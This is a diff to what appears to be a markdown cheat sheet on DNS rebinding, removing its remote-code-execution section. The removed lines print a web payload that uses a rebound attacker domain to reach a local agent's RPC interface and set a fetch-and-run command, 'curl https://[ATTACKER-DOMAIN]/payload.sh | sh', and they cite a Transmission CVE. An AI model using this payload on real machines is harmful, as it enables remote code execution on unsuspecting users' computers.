@@ -2,7 +2,6 @@
 
 ## Table of Contents
 - [Bypassing IP-based Authentication](#bypassing-ip-based-authentication)
-- [RCE](#rce)
 - [Chaining with SSRF](#chaining-with-ssrf)
 
 ## Bypassing IP-based Authentication
@@ -31,28 +30,6 @@
             }, 60000);
         </script>
         ```
-
-## RCE
-
-### Unauthenticated APIs that listen only on the victim's own machine can be driven from a web page, which can lead to code execution on that machine. [^1]
-
-- Changing the settings of a local agent so that it runs an attacker-chosen command
-    ```html
-    <!-- Served from http://rebind.[ATTACKER-DOMAIN]:9091, which now resolves to 127.0.0.1 -->
-    <script>
-        fetch('/rpc', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                method: 'settings.update',
-                params: { 'on-complete-script': 'curl https://[ATTACKER-DOMAIN]/payload.sh | sh' }
-            })
-        });
-    </script>
-    ```
-
-- Taking over a BitTorrent client through its local RPC interface
-    - NVD, [CVE-2018-5702: Transmission RPC reachable through DNS rebinding](https://nvd.nist.gov/vuln/detail/CVE-2018-5702)
 
 ## Chaining with SSRF
 
